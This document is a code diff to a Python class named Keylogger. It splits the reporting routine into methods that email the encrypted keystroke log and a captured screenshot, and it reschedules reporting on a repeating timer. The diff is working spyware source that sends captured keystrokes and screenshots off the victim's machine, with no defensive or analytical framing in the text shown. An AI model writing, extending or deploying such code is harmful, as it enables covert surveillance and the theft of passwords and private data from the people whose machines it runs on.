@@ -52,9 +52,15 @@ class Keylogger:
         finally:
             server.quit()
 
-    def report(self):
+    def send_keys(self):
         self.send_email(self.encrypt_log())
+
+    def send_screenshot(self):
         self.send_email(pyscreenshot.grab())
+
+    def report(self):
+        self.send_keys()
+        self.send_screenshot()
         self.log = ""
         timer = Timer(self.interval, self.report)
         timer.start()
